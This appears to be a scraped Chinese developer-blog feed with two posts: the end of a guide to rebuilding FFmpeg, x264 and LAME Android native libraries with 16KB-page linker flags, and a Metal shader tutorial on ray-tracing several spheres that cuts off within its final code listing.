<p>为Android编译 C/C++ 原生库依靠NDK，不同版本NDK对16KB Page Size的支持不一样。NDK 版本 r28 及更高版本默认编译为 16 KB 对齐。Android NDK r27及以下版本需要设置相关配置文件、编译脚本文件的参数，主要是链接器标志参数。谷歌官方推荐始终更新 NDK，但实际上对于旧项目而言更新NDK往往会带来一系列麻烦的问题（往往不是花一天两天能解决的），因此我依靠不升级NDK的适配方法。<br/>
适配 16KB 的关键在于，在原生库的链接阶段，告诉链接器（ld）将所有 ELF 程序段的对齐值设置为 16KB。我们可以使用以下链接器标志：</p>
<pre><code class="hljs language-ini" lang="ini">-Wl,-z,<span class="hljs-attr">max-page-size</span>=<span class="hljs-number">16384</span>
-Wl,-z,<span class="hljs-attr">common-page-size</span>=<span class="hljs-number">16384</span>
</code></pre>
<p>max-page-size是适配16KB Page Size的关键，它强制链接器将 ELF 文件中所有可加载的程序段（Program Segments，例如包含代码的 .text 段或包含数据的 .data 段）的对齐要求 p_align 设置为 16384 字节（16KB）。Android NDK r27~r23理论上用它就行。<br/>
common-page-size用于设置链接器在进行内部优化和确定文件布局时所使用的通用页大小。它影响链接器如何组织代码和数据，以优化空间利用和内存映射。它可以解决适配16KB Page Size过程中（对于Android NDK r22 及更低版本）旧版 GNU ld 和 LLVM lld 链接器中的 bug。<br/>
出于稳妥起见，我两个链接器标志都使用。</p>
<p>例如在CMakeLists.txt这样使用：</p>
<pre><code class="hljs language-bash" lang="bash">target_link_options(<span class="hljs-variable">${CMAKE_PROJECT_NAME}</span> PRIVATE <span class="hljs-string">"-Wl,-z,max-page-size=16384"</span>)
target_link_options(<span class="hljs-variable">${CMAKE_PROJECT_NAME}</span> PRIVATE <span class="hljs-string">"-Wl,-z,common-page-size=16384"</span>)     
</code></pre>
<h4 data-id="heading-6">重新交叉编译so库</h4>
<p>编译环境：VMware Workstation Pro中的ubuntu虚拟机<br/>
NDK：NDK r20<br/>
使用NDK交叉编译so库的时候在编译脚本加入上面两个链接器标志参数。<br/>
编译x264脚本关键部分如下：</p>
<pre><code class="hljs language-bash" lang="bash">    <span class="hljs-comment"># ...</span>
    <span class="hljs-built_in">export</span> LDFLAGS=<span class="hljs-string">"-Wl,-z,max-page-size=16384 -Wl,-z,common-page-size=16384"</span>
	
	<span class="hljs-keyword">function</span> build
	{
	<span class="hljs-built_in">echo</span> <span class="hljs-string">"&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; build start &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;"</span>
	
	  ./configure \
	  --prefix=<span class="hljs-variable">$TARGET</span> \
	  --enable-static \
	  --enable-shared \
	  --enable-pic \
	  --host=aarch64-linux-android \
	  --disable-asm \
	  --disable-opencl \
	  --disable-cli \
	  --cross-prefix=<span class="hljs-variable">$TOOLCHAIN</span>/bin/aarch64-linux-android- \
	  --sysroot=<span class="hljs-variable">$TOOLCHAIN</span>/sysroot \
	
	make clean
	make
	make install
	
	<span class="hljs-built_in">echo</span> <span class="hljs-string">"&gt;&gt;&gt;&gt;&gt;&gt; build done &lt;&lt;&lt;&lt;&lt;&lt;"</span>
	}
	
	build
</code></pre>
<p>编译LAME脚本关键部分如下：</p>
<pre><code class="hljs language-bash" lang="bash">    <span class="hljs-comment"># ...</span>
LDFLAGS=<span class="hljs-string">"-Wl,-z,max-page-size=16384 -Wl,-z,common-page-size=16384"</span>
API=24

<span class="hljs-keyword">function</span> build_android_arm
{
<span class="hljs-built_in">echo</span> <span class="hljs-string">"build for android <span class="hljs-variable">$CPU</span>"</span>
./configure \
--host=<span class="hljs-variable">$HOST</span> \
--disable-static \
--enable-shared \
--disable-frontend \
--prefix=<span class="hljs-string">"<span class="hljs-variable">$TARGET</span>"</span> \
LDFLAGS=<span class="hljs-string">"<span class="hljs-variable">${LDFLAGS}</span>"</span> \
CPPFLAGS=<span class="hljs-string">"-fPIC"</span>

make clean
make -j8
make install

<span class="hljs-built_in">echo</span> <span class="hljs-string">"build for android <span class="hljs-variable">$CPU</span> completed"</span>
}
</code></pre>
<p>最终编译FFmpeg关键部分如下：</p>
<pre><code class="hljs language-bash" lang="bash">DYNAMIC_LINKER_FLAGS=<span class="hljs-string">"-Wl,-z,max-page-size=16384 -Wl,-z,common-page-size=16384"</span>
<span class="hljs-comment"># ...</span>
<span class="hljs-keyword">function</span> build
{
  ./configure \
  --pkg-config=pkg-config \
  --pkg-config-flags=<span class="hljs-string">"--static"</span> \
  --prefix=<span class="hljs-variable">$OUTPUT</span> \
  --target-os=android \
  --<span class="hljs-built_in">arch</span>=arm64 \
  --cpu=armv8-a \
  --disable-x86asm \
  --disable-asm \
  --enable-neon \
  --enable-cross-compile \
  --enable-shared \
  --disable-static \
  --disable-doc \
  --disable-ffplay \
  --disable-ffprobe \
  --disable-symver \
  --disable-ffmpeg \
  --enable-pic \
  --sysroot=<span class="hljs-variable">$SYSROOT</span> \
  --cross-prefix=<span class="hljs-variable">$TOOLCHAIN</span>/bin/aarch64-linux-android- \
  --cross-prefix-clang=<span class="hljs-variable">$TOOLCHAIN</span>/bin/aarch64-linux-android<span class="hljs-variable">$API</span>- \
  --enable-encoder=aac \
  --enable-decoder=aac \
  --enable-gpl \
  --enable-encoder=libx264 \
  --enable-libx264 \
  --enable-encoder=libx265 \
  --enable-libx265 \
  --enable-libmp3lame \
  --extra-cflags=<span class="hljs-string">"-I<span class="hljs-variable">$X264_DIR</span>/include -I<span class="hljs-variable">$LAME_DIR</span>/include -I<span class="hljs-variable">$X265_DIR</span>/include"</span> \
  --extra-ldflags=<span class="hljs-string">"<span class="hljs-variable">$DYNAMIC_LINKER_FLAGS</span> -L<span class="hljs-variable">$X264_DIR</span>/lib -L<span class="hljs-variable">$LAME_DIR</span>/lib -L<span class="hljs-variable">$X265_DIR</span>/lib"</span> \
  --extra-cflags=<span class="hljs-string">"-fPIC"</span>

  make clean all
  <span class="hljs-comment"># 这里是定义用几个CPU编译</span>
  make -j12
  make install
}
</code></pre>
<p>可以看见都加上了max-page-size和common-page-size两个链接器标志，这样设置最终得到的so库是符合16KB Page Size要求的。</p>
<h4 data-id="heading-7">修改CMakeLists.txt重新构建项目</h4>
<p>将新鲜出炉的16KB so库放到Android项目的对应目录下。<br/>
注意在Android项目里面的CMakeLists.txt也需要添加max-page-size和common-page-size两个链接器标志。</p>
<pre><code class="hljs language-ini" lang="ini">target_link_libraries(

        <span class="hljs-comment"># 指定目标库，native-lib 是在上面 add_library 中配置的目标库</span>
        aeroffmpeglib

        <span class="hljs-comment"># 4. 连接 FFmpeg 相关的库</span>
        avutil
        swresample
        avcodec
        avfilter
        swscale
        avformat
        avdevice
        h264
        h265
        mp3lame
        ffmpeg

        -landroid
        OpenSLES
        -lEGL
        -lGLESv2
        <span class="hljs-comment"># Links the target library to the log library</span>
        <span class="hljs-comment"># included in the NDK.</span>
        ${log-lib}
        -Wl,-z,<span class="hljs-attr">max-page-size</span>=<span class="hljs-number">16384</span>
        -Wl,-z,<span class="hljs-attr">common-page-size</span>=<span class="hljs-number">16384</span>
)
</code></pre>
<p>修改CMakeLists.txt后重新同步配置信息并构建整个项目。</p>
<h3 data-id="heading-8">总结</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FIlovecat1949%2FAudioAndVideoEditor" target="_blank" title="https://github.com/Ilovecat1949/AudioAndVideoEditor" ref="nofollow noopener noreferrer">AudioAndVideoEditor</a>和<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FIlovecat1949%2FAeroFFmpeg" target="_blank" title="https://github.com/Ilovecat1949/AeroFFmpeg" ref="nofollow noopener noreferrer">AeroFFmpeg</a>现在应该都支持Android 16KB Page Size。<br/>
我希望谷歌以后少做涉及 C/C++ 原生库的更新了。</p>
<h3 data-id="heading-9">参考</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.google.cn%2Fguide%2Fpractices%2Fpage-sizes%3Fhl%3Dzh-cn" target="_blank" title="https://developer.android.google.cn/guide/practices/page-sizes?hl=zh-cn" ref="nofollow noopener noreferrer">谷歌支持 16 KB 的页面大小指南</a><br/>
<a href="https://juejin.cn/post/7396306532671094793" target="_blank" title="https://juejin.cn/post/7396306532671094793">Android 15 上适配 16K Page Size 的填坑思路，以 IJKPlayer 为例子</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Re: 0x03. 从零开始的光线追踪实现-多球体着色]]></title>    <link>https://juejin.cn/post/7575425466904576063</link>    <guid>https://juejin.cn/post/7575425466904576063</guid>    <pubDate>2025-11-23T07:18:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575425466904576063" data-draft-id="7575313772988071977" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Re: 0x03. 从零开始的光线追踪实现-多球体着色"/> <meta itemprop="keywords" content="macOS,计算机图形学"/> <meta itemprop="datePublished" content="2025-11-23T07:18:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="壕壕"/> <meta itemprop="url" content="https://juejin.cn/user/3180232448155495"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Re: 0x03. 从零开始的光线追踪实现-多球体着色
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3180232448155495/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    壕壕
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T07:18:55.000Z" title="Sun Nov 23 2025 07:18:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="" data-highlight-key="fancy">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">目标</h2>
<p><a href="https://juejin.cn/post/7555462803492356150" target="_blank" title="https://juejin.cn/post/7555462803492356150">上一节</a> 已经实现一个球显示在窗口中央，这节的目标是显示多个球。</p>
<h2 data-id="heading-1">本节最终效果</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e8652a0cb44b4827a06246fa4a33ff84~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aOV5aOV:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764487135&amp;x-signature=98peJZl8uLs8OXbMQaVJRZ5Ub20%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-2">先显示两个球</h2>
<p>我们先来想像现实场景，假设你桌子有一个有显示器，此时你举起手机录屏，你能很直观认识到手机离你更近，显示器离你更远，你的眼睛就是那个摄像机，它发出的射线，肯定是先到手机，再到显示器。<br/>
现在我们代码做得事情就是，球就是“手机”，背景（天空）就是“显示器”，通过 <code>intersect_sphere</code> 我们可以计算出把“显示器”挡住的“手机”。</p>
<p>回到之前的代码，只显示一个球，也就是满足光线跟球相交时，就告诉 fragment shader 这里要应该显示某个颜色</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">if</span> (<span class="hljs-built_in">intersect_sphere</span>(ray, sphere) &gt; <span class="hljs-number">0</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-built_in">vec4f</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0.76</span>, <span class="hljs-number">0.03</span>, <span class="hljs-number">1</span>);
}
</code></pre>
<p>现在我们要显示两个球，所以先弄一个数组。需要注意到，这里用 <code>constant</code> 是因为 MSL（Metal Shading Language）规定 <strong>Program scope variable must reside in constant address space</strong>（程序作用域的变量，必须放在常量地址空间），总之就是你要是写个函数外的常量，那就用 <code>constant</code> 把它放到常量地址空间去。</p>
<pre><code class="hljs language-cpp" lang="cpp">constant u32 OBJECT_COUNT = <span class="hljs-number">2</span>;

constant Sphere scene[OBJECT_COUNT] = {
  { .center = <span class="hljs-built_in">vec3f</span>(<span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>, <span class="hljs-number">-1.</span>), .radius = <span class="hljs-number">0.5</span> },
  { .center = <span class="hljs-built_in">vec3f</span>(<span class="hljs-number">0.</span>, <span class="hljs-number">-100.5</span>, <span class="hljs-number">-1.</span>), .radius = <span class="hljs-number">100.</span> },
};
</code></pre>
<p>声明结束后，在 fragment shader 函数内循环匹配光线相交。<br/>
我们把离咱们最近的值定义为 <code>closest_t</code>，初始值给个 Metal 内置的常量 <code>FLT_MAX</code>，它表示 float 的最大值（因为我们用了 <code>float</code> 类型），然后循环通过调用 <code>intersect_sphere</code> 计算的值 <code>t</code> 去更新 <code>closest_t</code>（因为 <code>intersect_sphere</code> 没匹配到会返回 <code>-1</code>，所以很显然我们要判断 <code>t &gt; 0.</code>，同时要再判断下这个 <code>t</code> 是比已知最近的还要近的值，也就是要满足 <code>t &lt; closest_t</code>）。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">fragment vec4f <span class="hljs-title">fragmentFn</span><span class="hljs-params">(Vertex in [[stage_in]], constant Uniforms &amp;uniforms [[buffer(<span class="hljs-number">1</span>)]])</span> </span>{
  <span class="hljs-comment">// ...</span>
  let ray = Ray { origin, direction };
  var <span class="hljs-type">closest_t</span> = FLT_MAX;
  <span class="hljs-keyword">for</span> (u32 i = <span class="hljs-number">0</span>; i &lt; OBJECT_COUNT; ++i) {
    var t = <span class="hljs-built_in">intersect_sphere</span>(ray, scene[i]);
    <span class="hljs-keyword">if</span> (t &gt; <span class="hljs-number">0.</span> &amp;&amp; t &lt; <span class="hljs-type">closest_t</span>) {
      <span class="hljs-type">closest_t</span> = t;
    }
  }
  <span class="hljs-keyword">if</span> (<span class="hljs-type">closest_t</span> &lt; FLT_MAX) {
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">vec4f</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0.76</span>, <span class="hljs-number">0.03</span>, <span class="hljs-number">1</span>);
  }
  <span class="hljs-keyword">return</span> <span class="hljs-built_in">vec4f</span>(<span class="hljs-built_in">sky_color</span>(ray), <span class="hljs-number">1</span>);
}
</code></pre>
<p>于是就会显示</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/416c454758084e83bcfa831977bd0651~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aOV5aOV:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764487135&amp;x-signature=%2BdxdeG3aGOK4%2BZr8VYwNxgoWgVo%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-3">改颜色</h2>
<p>这里因为我们设置的颜色是相同，所以连在一块根本分不清哪跟哪，所以我们可以让离得近得更亮，离得远的更暗，给原先设置的颜色再乘上一个值，<code>saturate</code> 这个是 MSL 内置的函数，作用是把小于 0 的转成 0，大于 1 的转成 1，在 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0, 1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1</span><span class="mclose">]</span></span></span></span></span> 范围内的不变，等于讲，大的就乘多一点，小的就乘少一点，符合近得更亮，远得更暗的要求</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">fragment vec4f <span class="hljs-title">fragmentFn</span><span class="hljs-params">(Vertex in [[stage_in]], constant Uniforms &amp;uniforms [[buffer(<span class="hljs-number">1</span>)]])</span> </span>{
  <span class="hljs-comment">// ...</span>
  let ray = Ray { origin, direction };
  var <span class="hljs-type">closest_t</span> = FLT_MAX;
  <span class="hljs-keyword">for</span> (u32 i = <span class="hljs-number">0</span>; i &lt; OBJECT_COUNT; ++i) {
    var t = <span class="hljs-built_in">intersect_sphere</span>(ray, scene[i]);
    <span class="hljs-keyword">if</span> (t &gt; <span class="hljs-number">0.</span> &amp;&amp; t &lt; <span class="hljs-type">closest_t</span>) {
      <span class="hljs-type">closest_t</span> = t;
    }
  }
  <span class="hljs-keyword">if</span> (<span class="hljs-type">closest_t</span> &lt; FLT_MAX) {
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">vec4f</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0.76</span>, <span class="hljs-number">0.03</span>, <span class="hljs-number">1</span>) * <span class="hljs-built_in">saturate</span>(<span class="hljs-number">1.</span> - <span class="hljs-type">closest_t</span>);
  }
  <span class="hljs-keyword">return</span> <span class="hljs-built_in">vec4f</span>(<span class="hljs-built_in">sky_color</span>(ray), <span class="hljs-number">1</span>);
}
</code></pre>
<p>现在我们能看到这个效果</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5a4ba77a46064f29a8b08f0592e42352~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aOV5aOV:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764487135&amp;x-signature=7jkvQsTSAYWCaWJq5mZyBFCZags%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-4">实现目标效果</h2>
<p>其实到这一步，只是换个颜色，为了实现目标效果，我们直接用 <code>closest_t</code> 作为基础值，在它的基础上转成颜色向量</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">if</span> (<span class="hljs-type">closest_t</span> &lt; FLT_MAX) {
  <span class="hljs-keyword">return</span> <span class="hljs-built_in">vec4f</span>(<span class="hljs-built_in">saturate</span>(<span class="hljs-type">closest_t</span>) * <span class="hljs-number">0.5</span>);
}
</code></pre>
<p>这样就能实现最终效果</p>
<hr/>
<p>最后总结一下代码</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;metal_stdlib&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> let const auto</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> var auto</span>

<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> metal;

<span class="hljs-keyword">using</span> vec2f = float2;
<span class="hljs-keyword">using</span> vec3f = float3;
<span class="hljs-keyword">using</span> vec4f = float4;

<span class="hljs-keyword">using</span> u8 = uchar;
<span class="hljs-keyword">using</span> i8 = <span class="hljs-type">char</span>;
<span class="hljs-keyword">using</span> u16 = ushort;
<span class="hljs-keyword">using</span> i16 = <span class="hljs-type">short</span>;
<span class="hljs-keyword">using</span> i32 = <span class="hljs-type">int</span>;
<span class="hljs-keyword">using</span> u32 = uint;
<span class="hljs-keyword">using</span> f16 = half;
<span class="hljs-keyword">using</span> f32 = <span class="hljs-type">float</span>;
<span class="hljs-keyword">using</span> usize = <span class="hljs-type">size_t</span>;

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">VertexIn</span> {
  vec2f position;
};

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Vertex</span> {
  vec4f position [[position]];
};

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Uniforms</span> {
  u32 width;
  u32 height;
};

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Ray</span> {
  vec3f origin;
  vec3f direction;
};

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Sphere</span> {
  vec3f center;
  f32 radius;
};

constant u32 OBJECT_COUNT = <span class="hljs-number">2</span>;
constant Sphere scene[OBJECT_COUNT] = {
  { .center = <span class="hljs-built_in">vec3f</span>(<span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>, <span class="hljs-number">-1.</span>), .radius = <span class="hljs-number">0.5</span> },
  { .center = <span class="hljs-built_in">vec3f</span>(<span class="hljs-number">0.</span>, <span class="hljs-number">-100.5</span>, <span class="hljs-number">-1.</span>), .radius = <span class="hljs-number">100.</span> },
};

<span class="hljs-function">f32 <span class="hljs-title">intersect_sphere</span><span class="hljs-params">(<span class="hljs-type">const</span> Ray ray, <span class="hljs-type">const</span> Sphere sphere)</span> </span>{
  let v = ray.origin - sphere.center;
  let a = <span class="hljs-built_in">dot</span>(ray.direction, ray.direction);
  let b = <span class="hljs-built_in">dot</span>(v, ray.direction);
  let c = <span class="hljs-built_in">dot</span>(v, v) - sphere.radius * sphere.radius;
  let d = b * b - a * c;
  <span class="hljs-keyword">if</span> (d &lt; <span class="hljs-number">0.</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-number">-1.</span>;
  }
  let sqrt_d = <span class="hljs-built_in">sqrt</span>(d);
  let recip_a = <span class="hljs-number">1.</span> / a;
  let mb = -b;
  let t = (mb - sqrt_d) * recip_a;
  <span class="hljs-keyword">if</span> (t &gt; <span class="hljs-number">0.</span>) {
    <span class="hljs-keyword">return</span> t;
  }
  <span class="hljs-keyword">return</span> (mb + sqrt_d) * recip_a;
}

<span class="hljs-function">vec3f <span class="hljs-title">sky_color</span><span class="hljs-params">(Ray ray)</span> </span>{
  let a = <span class="hljs-number">0.5</span> * (<span class="hljs-built_in">normalize</span>(ray.direction).y + <span class="hljs-number">1</span>);
  <span class="hljs-keyword">return</span> (<span class="hljs-number">1</span> - a) * <span class="hljs-built_in">vec3f</span>(<span class="hljs-number">1</span>) + a * <span class="hljs-built_in">vec3f</span>(<span class="hljs-number">0.5</span>, <span class="hljs-number">0.7</span>, <span class="hljs-number">1</span>);
}

<span class="hljs-function">vertex Vertex <span class="hljs-title">vertexFn</span><span class="hljs-params">(constant VertexIn *vertices [[buffer(<span class="hljs-number">0</span>)]], uint vid [[vertex_id]])</span> </span>{
  <span class="hljs-keyword">return</span> Vertex { <span class="hljs-built_in">vec4f</span>(vertices[vid].position, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) };
}

